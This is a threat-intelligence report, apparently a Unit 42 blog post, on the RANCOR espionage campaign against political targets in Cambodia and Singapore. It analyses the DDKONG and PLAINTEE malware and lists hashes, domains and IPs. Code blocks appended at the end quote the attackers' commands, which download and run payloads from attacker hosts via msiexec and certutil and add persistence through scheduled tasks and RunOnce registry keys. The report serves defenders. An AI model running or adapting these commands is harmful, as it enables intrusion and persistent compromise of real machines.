{
    "title": "rancor_ targeted attacks in south east asia using plaintee and ddkong malware families",
    "text": "Tools Playbooks Speaking Events About Us\nRANCOR: Targeted Attacks in South East Asia\nUsing PLAINTEE and DDKONG Malware Families\n32,258people reacted 1 12 min. read\nThroughout 2017 and 2018 Unit 42 has been tracking and observing a series of highly targeted attacks focused in\nSouth East Asia, building on our research into the KHRAT Trojan . Based on the evidence, these attacks appear to\nbe conducted by the same set of attackers using previously unknown malware families. In addition, these attacks\nappear to be highly targeted in their distribution of the malware used, as well as the targets chosen. Based on\nthese factors, Unit 42 believes the attackers behind these attacks are conducting their campaigns for espionage\npurposes.\nWe believe this group is previously unidentified and therefore have we have dubbed it “RANCOR”. The Rancor\ngroup’s attacks use two primary malware families which we describe in depth later in this blog and are naming\nDDKONG and PLAINTEE. DDKONG is used throughout the campaign and PLAINTEE appears to be new addition\nto these attackers’ toolkit.  Countries Unit 42 has identified as targeted by Rancor with these malware families\ninclude, but are not limited to:\nSingapore\nCambodia\nWe identified decoy files which indicate these attacks began with spear phishing messages but have not\nobserved the actual messages. These decoys contain details from public news articles focused primarily on\npolitical news and events. Based on this, we believe the Rancor attackers were targeting political entities. \nAdditionally, these decoy documents are hosted on legitimate websites including a government website belonging\nto the Cambodia Government and in at least once case, Facebook.\nThe malware and infrastructure used in these attacks falls into two distinct clusters, which we are labeling A and\nB, that are linked through their use of the PLAINTEE malware and several “softer” linkages.\n \nLinking the attacks\nBuilding on our previous research into KHRAT Trojan , we have been monitoring KHRAT command and control\ndomains. In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97.\nWe made this IP the center of our investigation.\nExamining passive DNS (pDNS) records from PassiveTotal  revealed several domain names associated with this IP\nthat mimic popular technology companies. One of these domains, facebook‐apps[.]com, was identified in one of\nthe malware samples associated with this IP address.\nThe following table depicts the two malware samples that are directly related to this IP address:\nSHA256Descriptio\nnConnection to IP\n \n0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855 LoaderC2 facebook‐\napps.com (resolves to\n89.46.222.97)\nc35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d PLAINTEEHosted on\n89.46.222.97\n \nDigging in further, the malware family we later named “PLAINTEE” appears to be quite unique with only six\nsamples present in our data set.\nApart from one sample (c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d), we were\nable to link all PLAINTEE samples together by the infrastructure they use. The diagram in Figure 1 shows the\nsamples, domains, IP addresses and e‐mail addresses that we identified during our investigation (See Appendix\nB for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap\nbetween the two.\nFigure 1 – Diagram showing the split of PLAINTEE samples across the two clusters of activity.\n \nOur Investigation into both clusters further showed that they were both involved in attacks targeting\norganizations in South East Asia. Based on the use of the relatively unique PLAINTEE malware, the malware’s use\nof the same file paths on in each cluster, and the similar targeting, we have grouped these attacks together under\nthe RANCOR campaign moniker.\n \nDelivery & Loader mechanisms\nFor many of the samples we’ve been unable to identify how they were delivered to end victims; however, in\nthree cases we were able to locate the files used to deliver the Trojan, which we found merited more\ninvestigation and are briefly discussed below.\n \nCluster A\nCase 1: Delivery via document property macro –\na789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483\n In our research we found at least one attack against a company leveraging a Microsoft Office Excel document\nwith an embedded macro to launch the malware. Interestingly, the delivery document borrowed a technique\nwhich was publicized in late 2017 as being used by the Sofacy threat actors , embedding the main malicious code\nin a EXIF metadata property of the document.\nBy doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious’ codes\nsmall footprint can help enable evasion of automated detection mechanisms based on macro content.\nFigure 2 – The entire contents of the macro\n \nThe ‘Company’ field in this case, contains the raw command that the attacker wishes to run, downloading and\nexecuting the next stage of the malware:\n \nCluster B\nCase 2: Delivery via HTA Loader – 1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458\n In this case the attackers sent an HTML Application file (.hta) to targets most likely as an email attachment. When\nopened and then executed, the key components of the HTA file downloads and executes further malware from a\nremote URLand loads a decoy image hosted externally (Figure 3).\n \nFigure 3 – The decoy image loaded when the .HTA file is executed.\n \nThe decoy in Figure 3 strongly suggests the attackers were conducting an attack against a political entity in\nCambodia. The Cambodia National Rescue Party is a politically motivated opposition movement.\n \nCase 3: Delivery via DLL Loader –\n0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855\n We identified three unique DLL loaders during this analysis. The loaders are extremely simple with a single\nexported function and are responsible for executing a single command. An exemplar command is given below:\nIn the above command, the malware is downloading and executing a payload and configuring it for persistent\nexecution. In two of the three examples, the malware also downloads and opens a decoy PDF document hosted\non a legitimate but compromised website. The decoy documents seen in these cases were related to Cambodian\nnews articles, an example is shown in Figure 4 below.\n \nFigure 4 – 1.pdf decoy delivered by downloader\n \nThe decoy above discusses a recent event that took place against political party supporters in Cambodia, a similar\ntheme to the decoy document observed in Figure 3.\nIt is worth noting that the third DLL mentioned attempts to download the decoy document from a government\nwebsite. This same website was used previously in a KHRat campaign targeting Cambodian citizens .\nAdditionally, two of the three DLL loaders were found to be hosted on this same compromised website, implying\nthat it was likely compromised again in early 2018. The filenames for these two DLL loaders are as follows:\nActivity Schedule.pdf\nអ កនេ  យក ត់េល ក ត  (Translated from Khmer: Poli cians betrayed on the betrayal)\nMalware Overview\nIn all cases where we were able to identify the final payloads used, the DDKONG  or PLAINTEE malware families\nwere used. We observed DDKONG in use between February 2017 and the present, while PLAINTEE is a newer\naddition with the earliest known sample being observed in October 2017. It’s unclear if DDKONG is only used by\none threat actor or more than one based on the data available.\nIn this section we’ll go over the capabilities and operation of these malware families.\n \nDDKONG\nFor the analysis below, we used the following file:\n \nSHA256 119572fafe502907e1d036cdf76f62b0308b2676ebdfc3a51dbab614d92bc7d0\nSHA1 25ba920cb440b4a1c127c8eb0fb23ee783c9e01a\nMD5 6fa5bcedaf124cdaccfa5548eed7f4b0\nCompile Time 2018‐03‐14 07:20:11 UTC\nFile Type PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n \nTable 1 – DDKONG sample analyzed in full.\n \nThe malware in question is configured with the following three exported functions:\nServiceMain\nRundll32Call\nDllEntryPoint\nThe ServiceMain exported function indicates that this DLL is expected to be loaded as a service. If this function is\nsuccessfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to\nrundll32.exe.\nThe Rundll32Call exported function begins by creating a named event named ‘RunOnce’. This event ensures that\nonly a single instance of DDKong is executed at a given time. If this is the only instance of DDKong running at the\ntime, the malware continues. If it’s not, it dies. This ensures that only a single instance of DDKong is executed at\na given time.\nDDKong attempts to decode an embedded configuration using a single byte XOR key of 0xC3. Once decoded,\nthe configuration contains the data shown in Figure 5 below.\nFigure 5 – Decoded configuration with fields highlighted\n \nAfter this configuration is decoded and parsed, DDKONG proceeds to send a beacon to the configured remote\nserver via a raw TCP connection. The packet has a header of length 32 and an optional payload. In the beacon, no\npayload is provided, and as such, the length of this packet is set to zero.\nFigure 6 – DDKONG beacon to remote C2\n \nAfter it sends the beacon, the malware expects a response command of either 0x4 or 0x6. Both responses\ninstruct the malware to download and load a remote plugin. In the event 0x4 is specified, the malware is\ninstructed to load the exported ‘InitAction’ function. If 0x6 is specified, the malware is instructed to load the\nexported ‘KernelDllCmdAction’ function. Prior to downloading the plugin, the malware downloads a buffer that is\nconcatenated with the embedded configuration and ultimately provided to the plugin at runtime. An example of\nthis buffer at runtime is below:\n \n00000000: 43 3A 5C 55 73 65 72 73  5C 4D 53 5C 44 65 73 6B  C:\\Users\\MS\\Desk\n00000010: 74 6F 70 5C 52 53 2D 41  54 54 20 56 33 5C 50 6C  top\\RS-ATT V3\\Pl\n00000020: 75 67 69 6E 42 69 6E 00  00 00 00 00 00 00 00 00  uginBin………uginBin………\n[TRUNCATED]\n00000100: 00 00 00 00 43 3A 5C 55  73 65 72 73 5C 4D 53 5C  ….C:\\Users\\MS\\\n00000110: 44 65 73 6B 74 6F 70 5C  52 53 2D 41 54 54 20 56  Desktop\\RS-ATT V\n00000120: 33 5C 5A 43 6F 6E 66 69  67 00 00 00 00 00 00 00 \n3\\ZConfig…….ZConfig…….\n[TRUNCATED]\n00000200: 00 00 00 00 00 00 00 00  00 40 00 00 F0 97 B5 01  ………@……\n \nAs we can see in the above text, two full file paths are included in this buffer, providing us with insight into the\noriginal malware family’s name, as well as the author. After this buffer is collected, the malware downloads the\nplugin and loads the appropriate function. During runtime, the following plugin was identified:\n \nSHA256 0517b62233c9574cb24b78fb533f6e92d35bc6451770f9f6001487ff9c154ad7\nSHA1 03defdda9397e7536cf39951246483a0339ccd35\nMD5 a5164c686c405734b7362bc6b02488cb\nCompile Time 2018‐03‐28 01:54:40 UTC\nFile Type PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nTable 2 – Plugin downloaded during runtime for DDKong sample.\n \nThis plugin provides the attacker with the ability to both list files and download/upload files on the victim\nmachine.\n \nPLAINTEE\nIn total we have been able to find six samples of PLAINTEE, which, based on our analysis, seems to be exclusively\nused by the RANCOR attackers. PLAINTEE is unusual in that it uses a custom UDP protocol for its network\ncommunications. For this walk through, we use the following sample:\nSHA256c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2a\ndc35eca473c505d\nSHA1 0bdb44255e9472d80ee0197d0bfad7d8eb4a18e9\nMD5 d5679158937ce288837efe62bc1d9693\nCompile Time 2018‐04‐02 07:57:38 UTC\nFile Type PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nTable 3 – PLAINTEE sample analyzed in full.\nThis sample is configured with three exported functions:\nAdd\nSub\nDllEntryPoint\nThe DLL expects the export named ‘Add’ to be used when initially loaded. When this function is executed\nPLAINTEE executes the following command in a new process to add persistence:\nNext, the malware calls the ‘Sub’ function which begins by spawning a mutex named ‘microsoftfuckedupb’ to\nensure only a single instance is running at a given time. In addition, PLAINTEE will create a unique GUID via a call\nto CoCreateGuid() to be used as an identifier for the victim. The malware then proceeds to collect general\nsystem enumeration data about the infected machine and enters a loop where it will decode an embedded config\nblob and send an initial beacon to the C2 server.\nThe configuration blob is encoded using a simple single‐byte XOR scheme. The first byte of the string is used as\nthe XOR key to in turn decode the remainder of the data.\n \nDecoding this blob yields the following information, also found within the original binary:\n \nOffset Description\n0x4 C2 port (0x1f99 – 8089)\n0x8 C2 host (45.76.176[.]236)\n0x10C Flag used to identify the malware in network communications. (default flag:4/2/2018 1:01:33 AM)\nTable 4 – Configuration stored in the malware.\n \nThe malware then proceeds to beacon to the configured port via a custom UDP protocol. The network traffic is\nencoded in a similar fashion, with a random byte being selected as the first byte, which is then used to decode\nthe remainder of the packet via XOR.  An example of the decoded beacon is show in Figure 7.\nFigure 7 PLAINTEE example beacon\n \nThe structure for this beacon is given in Table 5.\n \nOffset Description\n0x0 Victim GUID (8C8CEED9‐4326‐448B‐919E‐249EEC0238A3)\n0x25 Victim IP Address (192.168.180.154)\n0x45 Command (0x66660001)\n0x49 Length of payload (0x2f – 47)\n0x4d Field 1 – Windows major version (0x6 – Windows Vista+)\n0x51 Field 2 – Windows minor version (0x1 – Windows 7)\n0x55 Field 3 – Unknown (0x20)\n0x59 Payload (default flag:4/2/2018 1:01:33 AM)\nTable 5 – Beacon structure for PLAINTEE.\n \nThis beacon is continuously sent out until a valid response is obtained from the C2 server (there is no sleep timer\nset). After the initial beacon, there is a two second delay in between all other requests made. This response is\nexpected to have a return command of 0x66660002 and to contain the same GUID that was sent to the C2\nserver. Once this response is received, the malware spawns several new threads, with different Command\nparameters, with the overall objective of loading and executing a new plugin that is to be received from the C2\nserver.\nDuring a file analysis of PLAINTEE in WildFire , we observed the attackers download and execute a plugin during\nthe runtime for that sample. The retrieved plugin was as follows:\nSHA256 b099c31515947f0e86eed0c26c76805b13ca2d47ecbdb61fd07917732e38ae78\nSHA1 ac3f20ddc2567af0b050c672ecd59dddab1fe55e\nMD5 7c65565dcf5b40bd8358472d032bc8fb\nCompile Time 2017‐09‐25 00:54:18 UTC\nFile Type PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nTable 6 – PLAINTEE plugin observed in Wildfire\n \nPLAINTEE expects the downloaded plugin to be a DLL with an export function of either ‘shell’ or ‘file’. The plugin\nuses the same network protocol as PLAINTEE and so we were able to trivially decode further commands that\nwere sent.  The following commands were observed:\ntasklist\nipconfig /all\nThe attacker performed these two commands 33 seconds apart. As automated commands are typically\nperformed more quickly this indicates that they may have been sent manually by the attacker.\n \nConclusions\nThe RANCOR campaign represents a continued trend of targeted attacks against entities within the South East\nAsia region. In a number of instances, politically motivated lures were used to entice victims into opening and\nsubsequently loading previously undocumented malware families. These families made use of custom network\ncommunication to load and execute various plugins hosted by the attackers. Notably the PLAINTEE malwares’\nuse of a custom UDP protocol is rare and worth considering when building heuristics detections for unknown\nmalware. Palo Alto Networks will continue to monitor these actors, their malware, and their infrastructure going\nforward.\nPalo Alto Networks customers are protected against the threats discussed in this blog in the following ways:\nWildfire correctly identifies all samples discussed as malicious.\nTraps appropriately blocks the malware from executing.\nAutoFocus customers may track this threat via the KHRAT, DDKONG, PLAINTEE, and RANCOR tags.\nAdditional mitigations that could help to prevent attacks like these from succeeding in your environment include:\nChanging the default handler for “.hta” files in your environment so that they cannot be directly executed.hta”\nfiles in your environment so that they cannot be directly executed.\n \nAppendix A – PLAINTEE older variant\nOlder variants of PLAINTEE can be identified via the unique mutex created during runtime. At least three\nvariants of PLAINTEE have been identified to date, however, the following two samples have additional unique\ndifferences:\n \nHash Functions Mutex\nbcd37f1d625772c162350e5383903fe8dbed341ebf0dc38035be5078624c039e helloworld\nhelloworld1,hellow\norld2,sqmAddTostr\neam,DllEntryPointmicros\noftfuc\nkedup 6aad1408a72e7adc88c2e60631a6eee3d77f18a70e4eee868623588612efdd31\n \nThe following actions are performed with the additional functions:\nhelloworld – performs actions identical to the newer sample’s ‘Sub’ function\nhelloworld1 – accepts command-line arguments, performs a UAC bypass\nhelloworld2 – drops and compiles a mof filemof file\nsqmAddTostream – expected to run initially by the malware, checks OS version and\nloads the malware with helloworld2\n \nAppendix B\nType Value Cluster\nLoaders\nHash 0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855 B\nHash 1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458 B\nDomain www.facebook‐apps.com B\nDomain dlj40s.jdanief.xyz B\nIP 89.46.222.97 B\nHash a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483 A\nPLAINTEE\nHash 863a9199decf36895d5d7d148ce9fd622e825f393d7ebe7591b4d37ef3f5f677 A\nHash 22a5bd54f15f33f4218454e53679d7cfae32c03ddb6ec186fb5e6f8b7f7c098b A\nHash c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d B\nIP 199.247.6.253 A\nIP 45.76.176.236 A\nMutex microsoftfuckedupb A\nHash 9f779d920443d50ef48d4abfa40b43f5cb2c4eb769205b973b115e04f3b978f5 A\nHash bcd37f1d625772c162350e5383903fe8dbed341ebf0dc38035be5078624c039e A\nHash 6aad1408a72e7adc88c2e60631a6eee3d77f18a70e4eee868623588612efdd31 A\nHash b099c31515947f0e86eed0c26c76805b13ca2d47ecbdb61fd07917732e38ae78 A\nDomain goole.authorizeddns.us A\nMutex Microsoftfuckedup A\nIP 103.75.189.74 A\nIP 131.153.48.146 A\nDDKONG\nHash 15f4c0a589dff62200fd7c885f1e7aa8863b8efa91e23c020de271061f4918eb A\nDomain microsoft.authorizeddns.us A\nIP 103.75.191.177 A\nHash 0f102e66bc2df4d14dc493ba8b93a88f6b622c168e0c2b63d0ceb7589910999d A\nHash 84607a2abfd64d61299b0313337e85dd371642e9654b12288c8a1fc7c8c1cf0a A\nHash a725abb8fe76939f0e0532978eacd7d4afb4459bb6797ec32a7a9f670778bd7e A\nHash 82e1e296403be99129aced295e1c12fbb23f871c6fa2acafab9e08d9a728cb96 A\nHash 9996e108ade2ef3911d5d38e9f3c1deb0300aa0a82d33e36d376c6927e3ee5af A\nDomain www.google_ssl.onmypc.org A\nHash 18e102201409237547ab2754daa212cc1454f32c993b6e10a0297b0e6a980823 A\nIP 103.75.191.75 A\nHash c78fef9ef931ffc559ea416d45dc6f43574f524ba073713fddb79e4f8ec1a319 A\nHash 01315e211bac543195f2c703033ba31b229001f844854b147c4b2a0973a7d17b A\nHash b8528c8e325db76b139d46e9f29835382a1b48d8941c47060076f367539c2559 A\nHash df14de6b43f902ac8c35ecf0582ddb33e12e682700eb55dc4706b73f5aed40f6 A\nHash 177906cb9170adc26082e44d9ad1b3fbdcba7c0b57e28b614c1b66cc4a99f906 A\nHash 113ae6f4d6a2963d5c9a7f42f782b176da096d17296f5a546433f7f27f260895 A\nDomain ftp.chinhphu.ddns.ms A\nHash 128adaba3e6251d1af305a85ebfaafb2a8028eed3b9b031c54176ca7cef539d2 A\nDomain www.microsoft.https443.org A\nIP 45.121.146.26 A\nHash 5afbee76af2a09c173cf782fd5e51b5076b87f19b709577ddae1c8e5455fc642 A\nDomain msdns.otzo.com A\nHash 119572fafe502907e1d036cdf76f62b0308b2676ebdfc3a51dbab614d92bc7d0 A\nDomain goole.authorizeddns.us A\nIP 103.75.189.74 A\nGet updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from usBy Brittany Barbehenn , Josh Grunzweig  and Tom Lancaster\nJune 26, 2018 at 5:00 AM\nCategory: Unit 42\nTags: DDKONG , KHRAT, PLAINTEE , RANCOR\nEmail address Subscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.Popular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemapLegal No ces\nPrivacy\nTerms of Use\nDocumentsAccount\nManage Subscriptions\nReport a Vulnerability1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12cmd /c set /p=Set v=CreateObject (^\"Wscript.Shell^\" ):v.Run ^\"msiexec /q /i\n http://199.247.6.253/ud^\" ,false,0 <nul >\nC:\\Windows\\System32 \\spool\\drivers\\color\\tmp.vbs & schtasks  /create /sc MINUTE\n/tn \"Windows System\"  /tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"\n/mo 2 /F & schtasks  /create /sc MINUTE /tn \"Windows System\"  /tr\n\"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"  /mo 2 /RU SYSTEM /c set\n/p=Set v=CreateObject (^\"Wscript.Shell^\" ):v.Run ^\"msiexec /q /i\nhttp://199.247.6.253/ud^\" ,false,0 <nul >\nC:\\Windows\\System32 \\spool\\drivers\\color\\tmp.vbs & schtasks  /create /sc MINUTE\n/tn \"Windows System\"  /tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"\n/mo 2 /F & schtasks  /create /sc MINUTE /tn \"Windows System\"  /tr\n\"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"  /mo 2 /RU SYSTEM\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17cmd /c Echo CreateObject (\"WScript.Shell\" ).Run \"msiexec /q /i\nhttp:\\\\dlj40s.jdanief[.]xyz/images/word3.doc\" ,0\n>%userProfile %\\AppData\\Local\\Microsoft \\microsoft .vbs /c Echo\nCreateObject (\"WScript.Shell\" ).Run \"msiexec /q /i\nhttp:\\\\dlj40s.jdanief[.]xyz/images/word3.doc\" ,0\n>%userProfile %\\AppData\\Local\\Microsoft \\microsoft .vbs\nschtasks  /create /sc MINUTE /tn \"Windows Scheduled MaintenBa\"  /tr \"wscript\n%userProfile %\\AppData\\Local\\Microsoft \\microsoft .vbs\" /mo 10 /F /create /sc\nMINUTE /tn \" Windows Scheduled MaintenBa \" /tr \"wscript\n%userProfile %\\AppData\\Local\\Microsoft \\microsoft .vbs\" /mo 10 /F\n \ncmd /c certutil .exe -urlcache  -split -f\nhttp:\\\\\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData \\1.pdf&start\nC:\\ProgramData \\1.pdf /c certutil .exe -urlcache  -split -f\nhttp:\\\\\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData \\1.pdf&start\nC:\\ProgramData \\1.pdf\n1\n2\n3\n4\n5\n6cmd.exe /c reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\\nCurrentVersion\\RunOnce\"  /v \"Microsoft Audio\"  /t REG_SZ /d \"%APPDATA%\\Network\nService.exe\"  \"[path_to_PLAINTEE]\" ,Add /freg add\n\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\ CurrentVersion\\RunOnce\"  /v\n\"Microsoft Audio\"  /t REG_SZ /d \"%APPDATA%\\Network Service.exe\"\n\"[path_to_PLAINTEE]\" ,Add /f\nSearch Unit 42\nSHARE \n "
}